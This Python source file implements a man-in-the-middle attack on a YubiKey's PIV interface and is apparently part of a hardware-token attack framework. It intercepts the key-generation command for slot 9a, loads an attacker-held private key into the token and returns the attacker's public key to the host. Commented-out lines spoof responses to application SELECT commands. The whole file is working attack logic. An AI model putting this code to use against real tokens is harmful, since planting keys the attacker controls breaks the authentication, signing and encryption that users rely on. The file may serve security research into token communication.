from __future__ import absolute_import
import logging

from util import from_hex
from intercept_attack import InterceptAttack
from resp_codes import Resp
from .attacker_commands import *

logger = logging.getLogger()


class YubiKeyMITMAttack(InterceptAttack):
    def __init__(self, os):
        super(YubiKeyMITMAttack, self).__init__(os)
        self.responding_generate_asymm = False

    def respond_to_message(self, msg):
        if msg == from_hex('00 47 00 9A 05 AC 03 80 01 07'):
            logger.info('>>> Intercepting GENERATE ASYMMETRIC KEY PAIR slot 9a')

            for cmd in ATTACKER_PRIVK_IMPORT_ASYMM:
                if self.attacker_execute(from_hex(cmd)) != from_hex('90 00'):
                    return Resp.FAILURE

            self.responding_generate_asymm = True
            return from_hex(ATTACKER_PUBK_RESPONSE_GENERATE_ASYMM[0])

        elif self.responding_generate_asymm:
            self.responding_generate_asymm = False

            if msg == from_hex('00 C0 00 00 00'):
                logger.info('>>> Intercepting GET RESPONSE')
                return from_hex(ATTACKER_PUBK_RESPONSE_GENERATE_ASYMM[1])

            else:
                logger.info('>>> Expected GET RESPONSE')
                return Resp.FAILURE

        # if msg == '\x00\xA4\x04\x00\x09\xA0\x00\x00\x03\x08\x00\x00\x10\x00\x00':
        #     logger.info('Intercepting SELECT PIV Card Application AID')
        #     return '\x6A\x82'

        # if msg == '\x00\xA4\x04\x0C\x06\xD2\x76\x00\x01\x24\x01':
        #     logger.info('Intercepting SELECT OpenPGP Card')
        #     # return self.os.execute('\x00\xA4\x04\x00\x06\xD2\x76\x00\x01\x24\x01\x00')
        #     return '\x69\x02'
